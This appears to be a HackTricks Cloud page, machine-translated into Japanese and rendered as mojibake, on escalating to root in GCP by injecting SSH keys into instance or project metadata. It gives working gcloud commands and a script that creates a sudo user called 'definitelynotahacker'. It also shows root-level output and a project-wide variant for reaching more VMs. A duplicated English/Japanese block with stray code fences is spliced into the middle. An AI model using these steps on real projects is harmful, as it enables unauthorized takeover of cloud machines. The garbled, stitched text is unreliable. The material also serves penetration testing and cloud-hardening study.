# GCP - ã‚«ã‚¹ã‚¿ãƒ SSHãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã®è¿½åŠ 

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>

## ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã®å¤‰æ›´ <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’**å¤‰æ›´ã§ãã‚‹**å ´åˆã€ãƒ­ãƒ¼ã‚«ãƒ«ã§æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹æ–¹æ³•ã¯æ•°å¤šãã‚ã‚Šã¾ã™ã€‚ã“ã®æ¨©é™ã‚’æŒã¤ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¤ãªãŒã‚‹ã„ãã¤ã‹ã®ã‚·ãƒŠãƒªã‚ªãŒã‚ã‚Šã¾ã™ï¼š

_**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**_\
ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ã‚¢ã‚¯ã‚»ã‚¹**ã‚¹ã‚³ãƒ¼ãƒ—**ãŒ**å®Œå…¨ã‚¢ã‚¯ã‚»ã‚¹**ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹ã‹ã€å°‘ãªãã¨ã‚‚**ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ãƒˆAPIã¸ã®ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æ˜ç¤ºçš„ã«è¨±å¯ã—ã¦ã„ã‚‹å ´åˆã€ã“ã®è¨­å®šã¯æ˜‡æ ¼ã«**è„†å¼±**ã§ã™ã€‚**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ**ã®**ã‚¹ã‚³ãƒ¼ãƒ—**ã¯**è„†å¼±ã§ã¯ã‚ã‚Šã¾ã›ã‚“**ã€‚

_**ã‚«ã‚¹ã‚¿ãƒ ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**_\
ã‚«ã‚¹ã‚¿ãƒ ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã«ã¯ä»¥ä¸‹ã®IAMæ¨©é™ã®**ã„ãšã‚Œã‹ãŒå¿…è¦**ã§ã™ï¼š

* `compute.instances.setMetadata`ï¼ˆå˜ä¸€ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ãŸã‚ï¼‰
* `compute.projects.setCommonInstanceMetadata`ï¼ˆãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ã™ã¹ã¦ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ãŸã‚ï¼‰

Googleã¯ã‚«ã‚¹ã‚¿ãƒ ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ä½¿ç”¨ã—ãªã„ã“ã¨ã‚’[æ¨å¥¨](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance)ã—ã¦ã„ã¾ã™ãŒã€ãã‚Œã§ã‚‚å¯èƒ½ã§ã™ã€‚ä»¥ä¸‹ã®**ã‚¢ã‚¯ã‚»ã‚¹ã‚¹ã‚³ãƒ¼ãƒ—**ã®ã„ãšã‚Œã‹ãŒå¿…è¦ã§ã™ï¼š

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platform`

### **SSHã‚­ãƒ¼ã‚’ã‚«ã‚¹ã‚¿ãƒ ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«è¿½åŠ ã™ã‚‹**

GCPä¸Šã®**Linux** **ã‚·ã‚¹ãƒ†ãƒ **ã¯é€šå¸¸ã€[Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ä¸­ã«ã¯ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«å¯¾ã—ã¦**å®šæœŸçš„ã«**èªè¨¼ã•ã‚ŒãŸSSHå…¬é–‹ã‚­ãƒ¼ã®**å¤‰æ›´ã‚’ç…§ä¼š**ã™ã‚‹[accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ãŒã‚ã‚Šã¾ã™ã€‚

**æ–°ã—ã„å…¬é–‹**ã‚­ãƒ¼ãŒæ¤œå‡ºã•ã‚Œã‚‹ã¨ã€ãã‚Œã¯å‡¦ç†ã•ã‚Œã¦**ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚·ãƒ³ã«è¿½åŠ **ã•ã‚Œã¾ã™ã€‚ã‚­ãƒ¼ã®å½¢å¼ã«ã‚ˆã£ã¦ã¯ã€**æ—¢å­˜ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã®`~/.ssh/authorized_keys`ãƒ•ã‚¡ã‚¤ãƒ«ã«è¿½åŠ ã•ã‚Œã‚‹ã‹ã€`sudo`æ¨©é™ã‚’æŒã¤**æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆ**ã—ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§**ã‚«ã‚¹ã‚¿ãƒ ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´**ã§ãã‚‹å ´åˆã€ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®SSHæ¨©é™ã‚’**å–å¾—ã™ã‚‹**ã“ã¨ã§ã€ãƒ­ãƒ¼ã‚«ãƒ«ã‚·ã‚¹ãƒ†ãƒ ä¸Šã§rootã«**æ˜‡æ ¼**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´**ã§ãã‚‹å ´åˆã€accounts daemonã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ç¾åœ¨ã®GCPãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã®**ä»»æ„ã®ã‚·ã‚¹ãƒ†ãƒ **ã§rootã«**æ˜‡æ ¼**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **æ—¢å­˜ã®ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«SSHã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹**

ã¾ãšã€æ—¢å­˜ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«è‡ªåˆ†ã®ã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‹ã‚‰å§‹ã‚ã¾ã—ã‚‡ã†ã€‚ã“ã‚ŒãŒãŠãã‚‰ãæœ€ã‚‚å°‘ãªã„é¨’éŸ³ã‚’ç«‹ã¦ã‚‹ã§ã—ã‚‡ã†ã€‚

**ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§æ—¢å­˜ã®SSHã‚­ãƒ¼ã‚’ç¢ºèª**ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®1äººã‚’é¸ã³ã¾ã™ã€‚å½¼ã‚‰ã¯sudoæ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å¯èƒ½æ€§ãŒé«˜ã„ã§ã™ã€‚
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
```markdown
# GCP Compute Privilege Escalation via Custom SSH Metadata

## Overview

In GCP, instances can have custom metadata that is used to manage SSH keys. An attacker with the ability to modify an instance's metadata can add their own SSH key, allowing them to gain unauthorized access to that instance.

## Prerequisites

- Access to a GCP account with permissions to modify instance metadata.

## Step-by-Step Guide

1. Navigate to the GCP Console and select the target instance.
2. Go to the instance's details page and click on the "Edit" button.
3. Scroll down to the "SSH Keys" section.
4. Add your public SSH key to the instance's metadata.
5. Save the changes and SSH into the instance using your private key.

## Conclusion

By adding a custom SSH key to an instance's metadata, an attacker can escalate their privileges and gain full control over the instance. It is important for organizations to monitor and restrict who has the ability to modify instance metadata to prevent such attacks.
```

# GCP Compute Privilege Escalation via Custom SSH Metadata

## æ¦‚è¦

GCPã§ã¯ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã¯SSHã‚­ãƒ¼ã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚«ã‚¹ã‚¿ãƒ ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ãŒã‚ã‚Šã¾ã™ã€‚ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã™ã‚‹èƒ½åŠ›ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€è‡ªåˆ†ã®SSHã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€ãã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

## å‰ææ¡ä»¶

- ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã™ã‚‹æ¨©é™ã‚’æŒã¤GCPã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã€‚

## ã‚¹ãƒ†ãƒƒãƒ—ãƒã‚¤ã‚¹ãƒ†ãƒƒãƒ—ã‚¬ã‚¤ãƒ‰

1. GCPã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«ç§»å‹•ã—ã€å¯¾è±¡ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’é¸æŠã—ã¾ã™ã€‚
2. ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®è©³ç´°ãƒšãƒ¼ã‚¸ã«ç§»å‹•ã—ã€ã€Œç·¨é›†ã€ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚
3. ã€ŒSSHã‚­ãƒ¼ã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¾ã§ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ãƒ€ã‚¦ãƒ³ã—ã¾ã™ã€‚
4. ã‚ãªãŸã®å…¬é–‹SSHã‚­ãƒ¼ã‚’ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«è¿½åŠ ã—ã¾ã™ã€‚
5. å¤‰æ›´ã‚’ä¿å­˜ã—ã€ã‚ãªãŸã®ç§˜å¯†ã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«SSHã§æ¥ç¶šã—ã¾ã™ã€‚

## çµè«–

ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«ã‚«ã‚¹ã‚¿ãƒ SSHã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯è‡ªåˆ†ã®æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’å®Œå…¨ã«åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚çµ„ç¹”ã¯ã€ã“ã®ã‚ˆã†ãªæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã™ã‚‹èƒ½åŠ›ã‚’ç›£è¦–ã—ã€åˆ¶é™ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
å…¬é–‹éµã®**ã‚„ã‚„å¥‡å¦™ãªå½¢å¼**ã«æ³¨æ„ã—ã¦ãã ã•ã„ - **ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ãŒ**æœ€åˆ**ã«ï¼ˆã‚³ãƒ­ãƒ³ã«ç¶šã„ã¦ï¼‰ãƒªã‚¹ãƒˆã•ã‚Œã€ãã®å¾Œ**æœ€å¾Œ**ã«ã‚‚ã†ä¸€åº¦ãƒªã‚¹ãƒˆã•ã‚Œã¾ã™ã€‚ã“ã®å½¢å¼ã«åˆã‚ã›ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚é€šå¸¸ã®SSHã‚­ãƒ¼æ“ä½œã¨ã¯ç•°ãªã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¯çµ¶å¯¾ã«é‡è¦ã§ã™ï¼

**ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ã‚­ãƒ¼ãŒå«ã¾ã‚Œã‚‹è¡Œã‚’æ–°ã—ã„ãƒ†ã‚­ã‚¹ãƒˆ**ãƒ•ã‚¡ã‚¤ãƒ«`meta.txt`ã«ä¿å­˜ã—ã¾ã™ã€‚

ä¸Šè¨˜ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼`alice`ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã™ã‚‹ã¨ä»®å®šã—ã¾ã—ã‚‡ã†ã€‚æ¬¡ã®ã‚ˆã†ã«è‡ªåˆ†ç”¨ã®**æ–°ã—ã„ã‚­ãƒ¼ã‚’ç”Ÿæˆ**ã—ã¾ã™ï¼š
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
ãƒ•ã‚¡ã‚¤ãƒ« `meta.txt` ã«æ–°ã—ã„å…¬é–‹éµã‚’ä»¥ä¸‹ã®å½¢å¼ã§è¿½åŠ ã—ã¾ã™:
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
Now, you can **SSHã‚­ãƒ¼ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’æ›¸ãæ›ãˆã‚‹** ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã§ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãŸã‚ã«:
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
**`alice`ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ã‚·ã‚§ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ–¹æ³•ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š**
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **æ–°ã—ã„ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã€SSHã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹**

ä¸Šè¨˜ã®æ‰‹é †ã«å¾“ã£ã¦ã‚‚æ—¢å­˜ã®ã‚­ãƒ¼ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã€ã¾ãŸã¯`/etc/passwd`ã§ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã™ã‚‹èˆˆå‘³æ·±ã„ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã„ãªã„å ´åˆã¯ã©ã†ã§ã—ã‚‡ã†ã‹ï¼Ÿ

**åŒã˜ãƒ—ãƒ­ã‚»ã‚¹ã«å¾“ã£ã¦**ã€ãŸã **æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½œã‚Šã¾ã™**ã€‚ã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯è‡ªå‹•çš„ã«ä½œæˆã•ã‚Œã€`sudo`ã®æ¨©åˆ©ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚ã‚¹ã‚¯ãƒªãƒ—ãƒˆåŒ–ã•ã‚ŒãŸãƒ—ãƒ­ã‚»ã‚¹ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¬ãƒ™ãƒ«ã§ã®SSHã‚­ãƒ¼ <a href="#sshing-around" id="sshing-around"></a>

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§è¿°ã¹ãŸè©³ç´°ã«å¾“ã£ã¦ã€ã•ã‚‰ã«å¤šãã®VMã‚’ä¾µå®³ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã‚‰ã«å°‘ã—è©³ã—ãè§¦ã‚Œã‚‹ã“ã¨ã§ã€["Block project-wide SSH keys" ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æ˜ç¤ºçš„ã«é¸æŠã—ã¦ã„ãªã„ä»»æ„ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«å¯¾ã—ã¦ã€**ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®SSHã‚¢ã‚¯ã‚»ã‚¹**ã‚’è¨±å¯ã™ã‚‹ã€[**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¬ãƒ™ãƒ«ã§SSHã‚­ãƒ¼ã‚’é©ç”¨ã™ã‚‹**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide)ã“ã¨ãŒã§ãã¾ã™ã€‚
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
å¤§èƒ†ãªã‚‰ã€`gcloud compute ssh [INSTANCE]` ã‚’å…¥åŠ›ã—ã¦ã€ä»–ã®ãƒœãƒƒã‚¯ã‚¹ã§ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§<strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯ **HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
